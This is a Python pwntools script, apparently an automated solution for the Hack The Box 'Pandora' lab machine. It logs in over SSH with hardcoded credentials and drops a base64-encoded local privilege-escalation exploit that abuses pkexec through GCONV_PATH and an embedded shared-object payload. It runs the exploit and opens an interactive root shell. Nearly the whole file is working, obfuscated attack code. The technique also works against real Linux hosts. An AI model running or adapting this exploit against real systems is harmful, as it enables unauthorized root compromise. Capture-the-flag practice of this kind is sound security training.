try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Pandora ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

request = ssh(host='10.10.11.136', user='daniel', password='HotelBabylon23')
shell = request.process("/bin/sh")
payload = (b"aW1wb3J0IGJhc2U2NAppbXBvcnQgb3MKaW1wb3J0IHN5cwoKZnJvbSBjdHlwZXMgaW1wb3J0ICoK\nZnJvbSBjdHlwZXMudXRpbCBpbXBvcnQgZmluZF9saWJyYXJ5CgpwYXlsb2FkX2I2NCA9IGInJycK\nZjBWTVJnSUJBUUFBQUFBQUFBQUFBQU1BUGdBQkFBQUFrZ0VBQUFBQUFBQkFBQUFBQUFBQUFMQUFB\nQUFBQUFBQUFBQUFBRUFBT0FBQwpBRUFBQWdBQkFBRUFBQUFIQUFBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFBQUFBQUFBQUFBQUFBcndFQUFBQUFBQURNQVFBQUFBQUFBQUFRCkFBQUFBQUFBQWdBQUFBY0FB\nQUF3QVFBQUFBQUFBREFCQUFBQUFBQUFNQUVBQUFBQUFBQmdBQUFBQUFBQUFHQUFBQUFBQUFBQUFC\nQUEKQUFBQUFBQUJBQUFBQmdBQUFBQUFBQUFBQUFBQU1BRUFBQUFBQUFBd0FRQUFBQUFBQUdBQUFB\nQUFBQUFBQUFBQUFBQUFBQUFJQUFBQQpBQUFBQUFjQUFBQUFBQUFBQUFBQUFBTUFBQUFBQUFBQUFB\nQUFBSkFCQUFBQUFBQUFrQUVBQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUFBCkFBQUFBQUFBQUFBQUFB\nQUFBQUFBQUFBQUFBd0FBQUFBQUFBQWtnRUFBQUFBQUFBRkFBQUFBQUFBQUpBQkFBQUFBQUFBQmdB\nQUFBQUEKQUFDUUFRQUFBQUFBQUFvQUFBQUFBQUFBQUFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFB\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQpBQUFBU0RIL2FtbFlEd1ZJdUM5aWFXNHZjMmdBbVZC\nVVgxSmVhanRZRHdVPQonJycKcGF5bG9hZCA9IGJhc2U2NC5iNjRkZWNvZGUocGF5bG9hZF9iNjQp\nCgplbnZpcm9uID0gWwogICAgICAgIGInZXhwbG9pdCcsCiAgICAgICAgYidQQVRIPUdDT05WX1BB\nVEg9LicsCiAgICAgICAgYidMQ19NRVNTQUdFUz1lbl9VUy5VVEYtOCcsCiAgICAgICAgYidYQVVU\nSE9SSVRZPS4uL0xPTCcsCiAgICAgICAgTm9uZQpdCgp0cnk6CiAgICBsaWJjID0gQ0RMTChmaW5k\nX2xpYnJhcnkoJ2MnKSkKZXhjZXB0OgogICAgcHJpbnQoJycpCiAgICBzeXMuZXhpdCgpCgpwcmlu\ndCgnJykKdHJ5OgogICAgd2l0aCBvcGVuKCdwYXlsb2FkLnNvJywgJ3diJykgYXMgZjoKICAgICAg\nICBmLndyaXRlKHBheWxvYWQpCmV4Y2VwdDoKICAgIHByaW50KCcnKQogICAgc3lzLmV4aXQoKQpv\ncy5jaG1vZCgncGF5bG9hZC5zbycsIDBvMDc1NSkKCnRyeToKICAgIG9zLm1rZGlyKCdHQ09OVl9Q\nQVRIPS4nKQpleGNlcHQgRmlsZUV4aXN0c0Vycm9yOgogICAgcHJpbnQoJycpCmV4Y2VwdDoKICAg\nIHByaW50KCcnKQogICAgc3lzLmV4aXQoKQoKdHJ5OgogICAgd2l0aCBvcGVuKCdHQ09OVl9QQVRI\nPS4vZXhwbG9pdCcsICd3YicpIGFzIGY6CiAgICAgICAgZi53cml0ZShiJycpCmV4Y2VwdDoKICAg\nIHByaW50KCcnKQogICAgc3lzLmV4aXQoKQpvcy5jaG1vZCgnR0NPTlZfUEFUSD0uL2V4cGxvaXQn\nLCAwbzA3NTUpCgp0cnk6CiAgICBvcy5ta2RpcignZXhwbG9pdCcpCmV4Y2VwdCBGaWxlRXhpc3Rz\nRXJyb3I6CiAgICBwcmludCgnJykKZXhjZXB0OgogICAgcHJpbnQoJycpCiAgICBzeXMuZXhpdCgp\nCgp0cnk6CiAgICB3aXRoIG9wZW4oJ2V4cGxvaXQvZ2NvbnYtbW9kdWxlcycsICd3YicpIGFzIGY6\nCiAgICAgICAgZi53cml0ZShiJ21vZHVsZSAgVVRGLTgvLyAgICBJTlRFUk5BTCAgICAuLi9wYXls\nb2FkICAgIDJcbicpOwpleGNlcHQ6CiAgICBwcmludCgnJykKICAgIHN5cy5leGl0KCkKCmVudmly\nb25fcCA9IChjX2NoYXJfcCAqIGxlbihlbnZpcm9uKSkoKQplbnZpcm9uX3BbOl0gPSBlbnZpcm9u\nCgpsaWJjLmV4ZWN2ZShiJy91c3IvYmluL3BrZXhlYycsIGNfY2hhcl9wKE5vbmUpLCBlbnZpcm9u\nX3ApCg==")
shell.sendline(b"echo '%s' | base64 -d > exploit.py" % (payload))
time.sleep(0.3)
shell.sendline(b"python3 exploit.py")
time.sleep(0.3)
shell.sendline(b"export HOME=/root; cd")
time.sleep(0.3)
shell.sendline(b"sudo bash")
time.sleep(0.3)
shell.sendline(b"export TERM=xterm")
time.sleep(0.3)
shell.interactive()
